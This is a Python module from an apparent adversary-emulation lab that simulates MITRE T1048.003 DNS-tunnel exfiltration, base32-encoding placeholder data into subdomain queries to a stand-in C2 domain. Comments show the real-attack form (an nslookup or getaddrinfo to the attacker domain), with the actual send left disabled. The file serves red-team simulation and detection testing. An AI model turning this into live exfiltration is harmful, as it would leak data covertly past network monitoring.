"""
campaigns/exfiltration/dns_tunnel.py — T1048.003 Exfiltration Over DNS
MITRE ATT&CK: T1048.003 | Tactic: Exfiltration
"""

import os
import base64
import socket
import json
from datetime import datetime
from campaigns.base_campaign import BaseCampaign


class DnsTunnelCampaign(BaseCampaign):
    TECHNIQUE_ID = "T1048.003"
    TECHNIQUE_NAME = "Exfiltration Over Alternative Protocol: DNS"
    TACTIC = "Exfiltration"

    C2_DOMAIN = os.environ.get("C2_DNS_DOMAIN", "exfil.lab.local")
    CHUNK_SIZE = 32  # bytes per DNS label

    def run(self) -> dict:
        self.log_step("init", f"Starting DNS tunnel exfiltration to {self.C2_DOMAIN}")
        self.simulate_delay(1)

        # Step 1: Collect data to exfiltrate (benign lab data)
        payload = self._collect_payload()
        self.log_step("data_collection", f"Payload size: {len(payload)} bytes")
        self.simulate_delay(0.5)

        # Step 2: Encode payload into DNS-safe chunks
        chunks = self._encode_payload(payload)
        self.log_step("dns_encoding", f"Encoded into {len(chunks)} DNS queries")
        self.simulate_delay(1)

        # Step 3: Simulate DNS exfiltration
        sent = self._exfiltrate_via_dns(chunks)
        self.log_step("exfil_send", f"Transmitted {sent}/{len(chunks)} chunks", "simulated")

        results = {
            "technique": self.TECHNIQUE_ID,
            "c2_domain": self.C2_DOMAIN,
            "payload_size_bytes": len(payload),
            "dns_queries_generated": len(chunks),
            "chunks_sent": sent,
            "sample_queries": [f"{c}.{self.C2_DOMAIN}" for c in chunks[:3]],
            "timestamp": datetime.utcnow().isoformat(),
        }
        self.save_artifact("dns_tunnel_results.json", json.dumps(results, indent=2))
        return self.build_result(True, f"DNS tunnel demonstrated: {len(chunks)} queries generated")

    def _collect_payload(self) -> bytes:
        """Collect benign lab data as exfiltration payload."""
        data = f"LAB-EXFIL-SIMULATION|{datetime.utcnow().isoformat()}|user=lab-victim|hostname=victim-web|sensitive_data=DEMO_ONLY"
        return data.encode()

    def _encode_payload(self, payload: bytes) -> list:
        """Base32-encode payload and split into DNS label chunks."""
        encoded = base64.b32encode(payload).decode().lower().rstrip("=")
        return [encoded[i:i+self.CHUNK_SIZE] for i in range(0, len(encoded), self.CHUNK_SIZE)]

    def _exfiltrate_via_dns(self, chunks: list) -> int:
        """Simulate DNS query exfiltration (no actual DNS queries made)."""
        # In a real attack, each chunk would be sent as: nslookup <chunk>.<c2_domain>
        # We simulate here for lab safety
        sent = 0
        for chunk in chunks:
            query = f"{chunk}.{self.C2_DOMAIN}"
            # Simulate: socket.getaddrinfo(query, None)
            sent += 1
        return sent
